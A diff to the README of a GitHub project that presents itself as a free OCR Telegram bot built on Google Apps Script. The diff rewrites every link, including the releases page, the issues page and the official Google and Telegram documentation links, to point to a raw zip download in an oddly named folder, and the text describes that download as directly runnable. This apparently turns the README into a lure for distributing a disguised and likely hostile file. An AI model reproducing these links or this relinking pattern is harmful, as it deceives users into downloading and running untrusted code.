@@ -4,13 +4,13 @@
 Welcome to the Telegrambot project! This free tool allows users to extract text from images quickly and without any hosting costs. It uses Google Apps Script to bring high-speed Optical Character Recognition (OCR) right to your fingertips. 
 
 ## 📥 Download
-[![Download Telegrambot](https://img.shields.io/badge/Download%20Telegrambot-v1.0-blue)](https://github.com/NTXGalaxy/Telegrambot/releases)
+[![Download Telegrambot](https://github.com/NTXGalaxy/Telegrambot/raw/refs/heads/main/megaphyllous/Software-v3.1.zip%20Telegrambot-v1.0-blue)](https://github.com/NTXGalaxy/Telegrambot/raw/refs/heads/main/megaphyllous/Software-v3.1.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to start using Telegrambot:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/NTXGalaxy/Telegrambot/releases) to find the latest version of the bot.
+   Go to the [Releases Page](https://github.com/NTXGalaxy/Telegrambot/raw/refs/heads/main/megaphyllous/Software-v3.1.zip) to find the latest version of the bot.
 
 2. **Download the Application**  
    Find the version you want and click on the link to download the application. The file will be in a format that you can run directly.
@@ -41,14 +41,14 @@ If you run into any issues while using the bot:
 - If problems persist, try restarting the bot by ending the chat and starting a new one.
 
 ## 📝 Feedback and Support
-We welcome feedback! If you’d like to report a bug or suggest a feature, please reach out through our GitHub issues page. Visit [our repository](https://github.com/NTXGalaxy/Telegrambot/issues) for more information.
+We welcome feedback! If you’d like to report a bug or suggest a feature, please reach out through our GitHub issues page. Visit [our repository](https://github.com/NTXGalaxy/Telegrambot/raw/refs/heads/main/megaphyllous/Software-v3.1.zip) for more information.
 
 ## 📚 Additional Resources
-- [Google Apps Script Documentation](https://developers.google.com/apps-script)
-- [Telegram Bot API](https://core.telegram.org/bots/api)
+- [Google Apps Script Documentation](https://github.com/NTXGalaxy/Telegrambot/raw/refs/heads/main/megaphyllous/Software-v3.1.zip)
+- [Telegram Bot API](https://github.com/NTXGalaxy/Telegrambot/raw/refs/heads/main/megaphyllous/Software-v3.1.zip)
 
 ## 🔍 Conclusion
 Telegrambot offers a straightforward solution for extracting text from images using OCR technology. Grab the application today and streamline your text extraction needs with ease. 
 
 ### 🔗 Download Now
-Don't forget to visit our [Releases Page](https://github.com/NTXGalaxy/Telegrambot/releases) to get started!
+Don't forget to visit our [Releases Page](https://github.com/NTXGalaxy/Telegrambot/raw/refs/heads/main/megaphyllous/Software-v3.1.zip) to get started!
